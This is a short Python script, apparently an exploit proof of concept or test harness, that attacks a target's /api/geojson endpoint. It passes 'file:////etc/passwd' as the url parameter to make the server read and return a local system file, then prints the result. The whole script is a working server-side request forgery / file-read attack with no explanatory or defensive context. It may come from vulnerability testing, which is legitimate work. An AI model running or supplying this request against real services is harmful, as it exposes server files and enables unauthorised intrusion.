import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


def execute():
    res = requests.get(
        f"{target_url}/api/geojson", params={"url": "file:////etc/passwd"}
    )
    print(res.text)


cmds = [execute]


all_time = 5
sleep_time = all_time // len(cmds)

for cmd in cmds:
    print(f"sleeping for {sleep_time}.")
    time.sleep(sleep_time)
    cmd()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
